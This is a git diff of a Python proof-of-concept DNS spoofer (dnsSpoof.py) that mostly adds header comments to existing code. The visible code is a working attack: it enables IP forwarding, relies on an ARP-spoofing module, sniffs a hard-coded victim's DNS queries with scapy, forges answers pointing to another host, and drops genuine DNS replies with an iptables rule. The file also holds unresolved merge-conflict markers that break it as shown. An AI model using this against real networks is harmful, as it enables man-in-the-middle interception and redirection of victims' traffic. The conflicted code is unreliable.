@@ -1,17 +1,46 @@
 #!/usr/bin/python
 
-import ConfigParser, os, platform, sys, signal, multiprocessing, logging
+#-----------------------------------------------------------------------------
+#-- SOURCE FILE:    dnsSpoof.py -   DNS Spoofer Proof of Concept
+#--
+#-- FUNCTIONS:      configSectionMap(section)
+#--                 signalHandler(signal, frame)
+#--                 forward()
+#--                 default()
+#--
+#-- DATE:           November 5, 2015
+#--
+#-- DESIGNERS:      Brij Shah, Callum Styan
+#--
+#-- PROGRAMMERS:    Brij Shah, Callum Styan
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
+
+import ConfigParser, os, platform, sys, signal, multiprocessing, logging, time, argparse, arpSpoof
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import time
 import argparse
 import scapy
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, DNSQR
+<<<<<<< Updated upstream
 import arpSpoof, scan
+=======
+>>>>>>> Stashed changes
 
 operatingSystem = platform.system()
 victimIP = '192.168.0.19'
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       configSectionMap(section)
+#--
+#-- VARIABLES(S):   section - the section in the config file
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def configSectionMap(section):
     dict = {}
     config = ConfigParser.ConfigParser()
@@ -27,16 +56,36 @@ def configSectionMap(section):
             dict[option] = None
     return dict
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       signalHandler(signal, frame)
+#--
+#-- VARIABLES(S):   signal
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def signalHandler(signal, frame):
     default()
     sys.exit(0)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       forward()
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def forward():
     if operatingSystem == 'Darwin':
         os.system('sysctl -w net.inet.ip.forwarding=1')
     elif operatingSystem == 'Linux':
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       default()
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def default():
     if operatingSystem == 'Darwin':
         os.system('sysctl -w net.inet.ip.forwarding=0')
@@ -44,6 +93,14 @@ def default():
         os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
         os.system('iptables -F')
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       parse(packet)
+#--
+#-- VARIABLES(S):   packet - the packets being sniffed
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def parse(packet):
     if packet.haslayer(IP):
         if packet[0][1].src == '192.168.0.19':
@@ -55,10 +112,22 @@ def parse(packet):
                                   an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata="192.168.0.18")))
                     sendp(packetResponse, count=1, verbose=0)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       firewallRule()
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def firewallRule():
 	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
 	Popen([firewall], shell=True, stdout=PIPE)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       main()
+#--
+#-- NOTES:
+#--
+#-----------------------------------------------------------------------------
 def main():
     forward()
     variables = configSectionMap('ARP')
